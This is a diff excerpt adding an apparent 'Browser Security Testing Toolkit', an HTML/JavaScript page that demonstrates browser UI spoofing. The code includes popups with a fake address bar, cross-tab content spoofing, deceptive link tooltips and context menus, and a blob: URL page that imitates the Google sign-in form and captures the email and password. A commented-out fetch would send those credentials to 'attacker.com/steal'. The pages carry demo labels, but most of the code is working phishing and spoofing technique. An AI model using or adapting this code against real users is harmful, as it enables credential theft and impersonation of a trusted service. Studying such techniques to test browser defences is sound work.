+                            margin: 0;
+                            font-family: Arial, sans-serif;
+                        }
+                        .fake-url-bar {
+                            background: #f1f1f1;
+                            padding: 10px;
+                            border-bottom: 1px solid #ccc;
+                            display: flex;
+                            align-items: center;
+                            gap: 10px;
+                        }
+                        .url-display {
+                            flex: 1;
+                            background: white;
+                            padding: 8px;
+                            border: 1px solid #ddd;
+                            border-radius: 3px;
+                            font-family: monospace;
+                            font-size: 14px;
+                        }
+                        .content {
+                            padding: 40px;
+                            text-align: center;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="fake-url-bar">
+                        <span style="color: green;">🔒</span>
+                        <div class="url-display">https://drive.google.com</div>
+                        <button onclick="window.close()">×</button>
+                    </div>
+                    <div class="content">
+                        <h1>Google Drive</h1>
+                        <p>This is a fake page demonstrating UI spoofing</p>
+                        <p>Address bar is hidden by window features</p>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            log('Window opened without address bar', 'success');
+        }
+        
+        function runCrossTabComms() {
+            log('Setting up cross-tab communication...', 'info');
+            
+            const newTab = window.open('about:blank', '_blank');
+            
+            if (!newTab) {
+                log('New tab blocked', 'warning');
+                return;
+            }
+            
+            newTab.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Loading Google Services...</title>
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            padding: 40px;
+                            text-align: center;
+                        }
+                        .loader {
+                            border: 5px solid #f3f3f3;
+                            border-top: 5px solid #4285f4;
+                            border-radius: 50%;
+                            width: 50px;
+                            height: 50px;
+                            animation: spin 1s linear infinite;
+                            margin: 20px auto;
+                        }
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h2>Google Services</h2>
+                    <p>Initializing secure connection...</p>
+                    <div class="loader"></div>
+                    <script>
+                        // Listen for commands
+                        window.addEventListener('message', function(event) {
+                            console.log('Received command:', event.data);
+                            
+                            if (event.data.command === 'spoof') {
+                                document.body.innerHTML = event.data.html;
+                                document.title = event.data.title;
+                            }
+                            
+                            if (event.data.command === 'alert') {
+                                alert(event.data.message);
+                            }
+                        });
+                        
+                        // Signal readiness
+                        window.opener.postMessage({type: 'ready', tab: 'spoof'}, '*');
+                    <\/script>
+                </body>
+                </html>
+            `);
+            newTab.document.close();
+            
+            // Listen for ready signal
+            const messageHandler = function(event) {
+                if (event.data.type === 'ready') {
+                    log('New tab ready, sending spoof command...', 'success');
+                    
+                    // Send spoof content
+                    newTab.postMessage({
+                        command: 'spoof',
+                        html: `
+                            <h1>🔐 Google Security Center</h1>
+                            <p>Your account requires verification</p>
+                            <button onclick="alert('Would redirect to phishing')">
+                                Verify Account
+                            </button>
+                        `,
+                        title: 'Google Security'
+                    }, '*');
+                    
+                    // Remove listener
+                    window.removeEventListener('message', messageHandler);
+                }
+            };
+            
+            window.addEventListener('message', messageHandler);
+        }
+        
+        // a[href] techniques
+        function runHoverSpoof() {
+            log('Creating hover spoof link...', 'info');
+            
+            const link = document.createElement('a');
+            link.href = 'javascript:alert("This is actually a javascript: link!")';
+            link.innerText = 'Secure Google Login';
+            link.title = 'https://accounts.google.com'; // Tooltip
+            link.style.cssText = `
+                display: inline-block;
+                padding: 10px 20px;
+                margin: 20px;
+                background: linear-gradient(135deg, #1a73e8, #4285f4);
+                color: white;
+                text-decoration: none;
+                border-radius: 8px;
+                font-weight: 500;
+                box-shadow: 0 2px 10px rgba(26, 115, 232, 0.3);
+                transition: transform 0.2s;
+            `;
+            
+            link.addEventListener('mouseover', function() {
+                this.style.transform = 'translateY(-2px)';
+            });
+            
+            link.addEventListener('mouseout', function() {
+                this.style.transform = 'translateY(0)';
+            });
+            
+            document.body.appendChild(link);
+            log('Hover spoof link created (hover to see fake tooltip)', 'success');
+        }
+        
+        function runContextMenuSpoof() {
+            log('Creating right-click spoof link...', 'info');
+            
+            const link = document.createElement('span'); // Using span instead of a
+            link.style.cssText = `
+                display: inline-block;
+                padding: 10px 20px;
+                margin: 20px;
+                color: #1a73e8;
+                cursor: pointer;
+                border-bottom: 1px dotted #1a73e8;
+                font-weight: 500;
+            `;
+            link.innerText = 'Google Account Login';
+            
+            // Actual click action
+            link.addEventListener('click', () => {
+                alert('Demo: This would redirect to phishing site');
+            });
+            
+            // Custom right-click menu
+            link.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                
+                const menu = document.createElement('div');
+                menu.style.cssText = `
+                    position: fixed;
+                    background: white;
+                    border: 1px solid #ddd;
+                    border-radius: 4px;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+                    min-width: 250px;
+                    z-index: 10000;
+                    font-family: Arial, sans-serif;
+                `;
+                
+                menu.innerHTML = `
+                    <div style="padding: 12px; border-bottom: 1px solid #eee;">
+                        <div style="font-size: 12px; color: #666; margin-bottom: 4px;">Link address:</div>
+                        <div style="font-family: monospace; color: #1a73e8; font-size: 14px;">
+                            https://accounts.google.com
+                        </div>
+                    </div>
+                    <div style="padding: 8px 12px; cursor: pointer; hover {background: #f5f5f5;}"
+                         onmouseover="this.style.background='#f5f5f5'"
+                         onmouseout="this.style.background='white'"
+                         onclick="window.open('about:blank', '_blank')">
+                        Open in new tab
+                    </div>
+                    <div style="padding: 8px 12px; cursor: pointer; hover {background: #f5f5f5;}"
+                         onmouseover="this.style.background='#f5f5f5'"
+                         onmouseout="this.style.background='white'"
+                         onclick="alert('Copied (fake)')">
+                        Copy link address
+                    </div>
+                `;
+                
+                menu.style.left = e.clientX + 'px';
+                menu.style.top = e.clientY + 'px';
+                
+                document.body.appendChild(menu);
+                
+                // Remove menu on click
+                setTimeout(() => {
+                    const removeMenu = () => {
+                        menu.remove();
+                        document.removeEventListener('click', removeMenu);
+                    };
+                    document.addEventListener('click', removeMenu);
+                }, 100);
+            });
+            
+            document.body.appendChild(link);
+            log('Right-click spoof link created (right-click to see fake menu)', 'success');
+        }
+        
+        function runBlobUrlSpoof() {
+            log('Creating blob URL phishing link...', 'info');
+            
+            const phishingPage = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Account</title>
+                    <meta charset="UTF-8">
+                    <style>
+                        * {
+                            margin: 0;
+                            padding: 0;
+                            box-sizing: border-box;
+                            font-family: 'Google Sans', Arial, sans-serif;
+                        }
+                        body {
+                            background: #f8f9fa;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 100vh;
+                            padding: 20px;
+                        }
+                        .login-container {
+                            background: white;
+                            border-radius: 8px;
+                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                            width: 100%;
+                            max-width: 450px;
+                            overflow: hidden;
+                        }
+                        .google-header {
+                            padding: 40px 40px 20px;
+                            text-align: center;
+                        }
+                        .google-logo {
+                            font-size: 42px;
+                            font-weight: 500;
+                            margin-bottom: 16px;
+                            color: #5f6368;
+                        }
+                        .form-group {
+                            padding: 0 40px 20px;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 14px;
+                            margin-bottom: 20px;
+                            border: 1px solid #dadce0;
+                            border-radius: 4px;
+                            font-size: 16px;
+                            transition: border 0.2s;
+                        }
+                        input:focus {
+                            border-color: #1a73e8;
+                            outline: none;
+                            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+                        }
+                        .login-button {
+                            width: 100%;
+                            padding: 14px;
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            border-radius: 4px;
+                            font-size: 16px;
+                            font-weight: 500;
+                            cursor: pointer;
+                            transition: background 0.2s;
+                        }
+                        .login-button:hover {
+                            background: #1664c4;
+                        }
+                        .footer {
+                            padding: 20px 40px;
+                            text-align: center;
+                            border-top: 1px solid #eee;
+                            color: #5f6368;
+                            font-size: 12px;
+                        }
+                        .demo-warning {
+                            background: #fff3cd;
+                            border: 1px solid #ffeaa7;
+                            padding: 10px;
+                            margin: 20px 40px;
+                            border-radius: 4px;
+                            text-align: center;
+                            color: #856404;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="login-container">
+                        <div class="google-header">
+                            <div class="google-logo">G</div>
+                            <h2 style="color: #202124; margin-bottom: 8px;">Sign in</h2>
+                            <p style="color: #5f6368;">to continue to Google</p>
+                        </div>
+                        
+                        <div class="demo-warning">
+                            ⚠ DEMONSTRATION ONLY - This is a blob: URL phishing simulation
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="email" placeholder="Email or phone" id="email">
+                            <input type="password" placeholder="Password" id="password">
+                            <button class="login-button" onclick="handleLogin()">Next</button>
+                        </div>
+                        
+                        <div class="footer">
+                            <p>English (United States) ⏷</p>
+                            <p>Help • Privacy • Terms</p>
+                        </div>
+                    </div>
+                    
+                    <script>
+                        function handleLogin() {
+                            const email = document.getElementById('email').value;
+                            const password = document.getElementById('password').value;
+                            
+                            if (email && password) {
+                                alert('DEMO: Credentials would be stolen:\\nEmail: ' + email + '\\nPassword: ' + password);
+                                
+                                // In real attack, exfiltrate credentials
+                                // fetch('https://attacker.com/steal', {
+                                //     method: 'POST',
+                                //     body: JSON.stringify({email, password}),
+                                //     mode: 'no-cors'
+                                // });
+                                
+                                // Then redirect to real Google
+                                setTimeout(() => {
+                                    window.location.href = 'https://www.google.com';
+                                }, 1000);
+                            } else {
+                                alert('Please fill in both fields');
+                            }
+                        }
+                        
+                        // Auto-show security alert
+                        setTimeout(() => {
+                            alert('🔐 Google Security Alert: Please verify your identity');
+                        }, 2000);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            const blob = new Blob([phishingPage], { type: 'text/html' });
+            const blobUrl = URL.createObjectURL(blob);
+            
+            const link = document.createElement('a');
+            link.href = blobUrl;
+            link.target = '_blank';
+            link.innerHTML = `
+                <i class="fas fa-external-link-alt"></i> 
+                Secure Google Login (Advanced Blob Demo)
+            `;
+            link.style.cssText = `
+                display: inline-block;
+                padding: 15px 30px;
+                background: linear-gradient(135deg, #1a73e8, #4285f4);
+                color: white;
+                text-decoration: none;
+                border-radius: 10px;
+                font-weight: 600;
+                margin: 20px;
+                box-shadow: 0 4px 15px rgba(26, 115, 232, 0.3);
+                transition: all 0.3s;
+                border: 2px solid rgba(255,255,255,0.3);
+            `;
+            
+            link.addEventListener('mouseover', () => {
+                link.style.transform = 'translateY(-3px)';
+                link.style.boxShadow = '0 6px 20px rgba(26, 115, 232, 0.4)';
+            });
+            
+            link.addEventListener('mouseout', () => {
+                link.style.transform = 'translateY(0)';
+                link.style.boxShadow = '0 4px 15px rgba(26, 115, 232, 0.3)';
+            });
+            
+            document.body.appendChild(link);
+            
+            // Show blob URL
+            const urlDisplay = document.createElement('div');
+            urlDisplay.className = 'url-display';
+            urlDisplay.innerHTML = `
+                <strong>Blob URL:</strong><br>
+                <code>${blobUrl.substring(0, 100)}...</code><br>
+                <small>This opens a sophisticated phishing page in a new tab</small>
+            `;
+            document.body.appendChild(urlDisplay);
+            
+            log('Advanced blob URL phishing link created', 'success');
+        }
+        
+        // Advanced techniques
+        function runSWCachePoison() {
+            log('Service Worker cache poisoning not implemented in demo', 'warning');
+            alert('This technique requires server setup for proper demonstration.');
+        }
+        
+        function runIframeOriginSpoof() {
+            log('Creating iframe origin spoof...', 'info');
+            
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-scripts allow-same-origin allow-forms allow-modals';
+            iframe.style.cssText = `
+                width: 500px;
+                height: 400px;
+                border: 2px solid #4285f4;
+                border-radius: 10px;
+                margin: 20px;
+            `;
+            
+            iframe.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Docs</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 20px;
+                            font-family: Arial, sans-serif;
+                            background: #f8f9fa;
+                        }
+                        .header {
+                            display: flex;
+                            align-items: center;
+                            gap: 10px;
+                            margin-bottom: 20px;
+                            padding-bottom: 10px;
+                            border-bottom: 1px solid #ddd;
+                        }
+                        .logo {
+                            font-size: 24px;
+                            color: #4285f4;
+                        }
+                        .url-bar {
+                            flex: 1;
+                            background: white;
+                            padding: 8px;
+                            border: 1px solid #ddd;
+                            border-radius: 4px;
+                            font-family: monospace;
+                            font-size: 14px;
+                            color: #0d652d;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="header">
+                        <div class="logo">📄</div>
+                        <div class="url-bar">https://docs.google.com/document/d/12345</div>
+                    </div>
+                    <h2>Important Document</h2>
+                    <p>This iframe shows content spoofing a Google Docs URL</p>
+                    <p>Check the "address bar" above - it's just HTML/CSS</p>
+                    <button onclick="alert('Demo action')">Click me</button>
+                    
+                    <script>
+                        // Fake analytics
+                        console.log('Google Docs loaded (fake)');
+                        
+                        // Show alert after delay
+                        setTimeout(() => {
+                            alert('Google Docs: Document updated');
+                        }, 3000);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            document.body.appendChild(iframe);
+            log('iframe with fake address bar created', 'success');
+        }
+        
+        function runHistorySpoof() {
+            log('Testing History API manipulation...', 'info');
+            
+            try {
+                // Try to push fake state
+                history.pushState({page: 'google'}, 'Google', '/login');
+                log('History state pushed (check URL bar)', 'success');
+                
+                // Show current URL
+                alert(`Current URL (fake): ${window.location.href}\n\nNote: This only affects browser history, not actual navigation.`);
+                
+                // Restore after 5 seconds
+                setTimeout(() => {
+                    history.back();
+                    log('History restored', 'info');
+                }, 5000);
+                
+            } catch(e) {
+                log(`History manipulation blocked: ${e.message}`, 'error');
+            }
+        }
+        
+        // Protection tests
+        function testPopupBlocking() {
+            log('Testing popup blocking...', 'info');
+            
+            // Test without user gesture
+            setTimeout(() => {
+                const win = window.open('about:blank');
+                if (win) {
+                    win.close();
+                    log('Popup allowed (no user gesture needed)', 'warning');
+                } else {
+                    log('Popup blocked (good protection)', 'success');
+                }
+            }, 100);
+            
+            // Test with simulated user gesture
+            const btn = document.createElement('button');
+            btn.textContent = 'Test Popup (click me)';
+            btn.onclick = () => {
+                const win = window.open('about:blank');
+                if (win) {
+                    win.close();
+                    log('Popup allowed after user click', 'info');
+                } else {
+                    log('Popup blocked even with user gesture', 'success');
+                }
+            };
+            document.body.appendChild(btn);
+        }
+        
+        function testCORSProtection() {
+            log('Testing CORS protection...', 'info');
+            
+            // Try to access Google from different origin
+            fetch('https://www.google.com')
+                .then(() => log('CORS allowed (unexpected)', 'warning'))
+                .catch(e => log(`CORS blocked: ${e.message}`, 'success'));
+        }
+        
+        function testSOP() {
+            log('Testing Same-Origin Policy...', 'info');
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'about:blank';
+            
+            iframe.onload = () => {
+                try {
+                    // Try to access iframe content
+                    const doc = iframe.contentDocument || iframe.contentWindow.document;
+                    doc.write('<h1>Test</h1>');
+                    log('SOP bypass possible (same origin)', 'warning');
+                } catch(e) {
+                    log(`SOP enforced: ${e.message}`, 'success');
+                }
+                document.body.removeChild(iframe);
+            };
+            
+            document.body.appendChild(iframe);
+        }
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            log('Browser Security Testing Toolkit loaded', 'success');
+            log(`User Agent: ${navigator.userAgent}`, 'info');
+        });
+    </script>
+</body>
+</html>
